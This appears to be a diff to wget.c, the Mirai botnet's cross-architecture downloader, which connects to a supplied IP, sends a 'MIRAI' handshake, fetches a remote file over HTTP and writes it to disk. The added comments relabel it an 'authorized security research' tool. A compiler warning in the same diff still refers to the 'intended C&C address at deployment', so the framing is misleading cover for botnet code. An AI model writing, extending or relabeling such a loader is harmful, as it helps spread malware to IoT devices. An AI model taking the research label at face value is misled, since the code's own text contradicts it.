@@ -1,3 +1,18 @@
+/*
+ * wget.c - Mirai 2026 Minimal HTTP Downloader (Research Tool)
+ * 
+ * Cross-architecture HTTP client for downloading files from authorized servers.
+ * Uses raw syscalls for maximum portability across IoT architectures (ARM, MIPS, x86).
+ * Intended for authorized security research and education only.
+ * 
+ * Wire Protocol:
+ *   1. Send EXEC_MSG ("MIRAI\n") on successful connect
+ *   2. Send HTTP GET request: GET <remote_file> HTTP/1.1\r\nHost: <host>\r\nConnection: close\r\n\r\n
+ *   3. Parse HTTP response headers (scan for \r\n\r\n)
+ *   4. Write response body to local file
+ *   5. Send DOWNLOAD_MSG ("FIN\n") on completion
+ */
+
 #include <sys/types.h>
 //#include <bits/syscalls.h>
 #include <sys/syscall.h>
@@ -5,6 +20,16 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <string.h>
+
+/* Compile-time research build flag */
+#ifdef RESEARCH_MODE
+#define RESEARCH_BUILD_MARKER "RESEARCH_BUILD\n"
+#endif
+
+/* Optional compile-time authorized server enforcement (for research builds) */
+#ifdef AUTHORIZED_SERVER
+#warning "AUTHORIZED_SERVER defined - ensure this matches intended C&C address at deployment"
+#endif
 
 #define EXEC_MSG            "MIRAI\n"
 #define EXEC_MSG_LEN        6
@@ -61,12 +86,19 @@ void xprintf(char *str)
 #endif
 
 // wget ip_address remote_file host
+//
+// Wire protocol flow:
+//   EXEC_MSG -> Connect to server -> Send HTTP GET -> Parse headers -> Write body -> DOWNLOAD_MSG -> Exit
 int main(int argc, char **args)
 {
     char recvbuf[128];
     struct sockaddr_in addr;
     int sfd, ffd;
     unsigned int header_parser = 0;
+
+#ifdef RESEARCH_MODE
+    write(STDOUT, RESEARCH_BUILD_MARKER, sizeof(RESEARCH_BUILD_MARKER) - 1);
+#endif
 
     write(STDOUT, EXEC_MSG, EXEC_MSG_LEN);
 
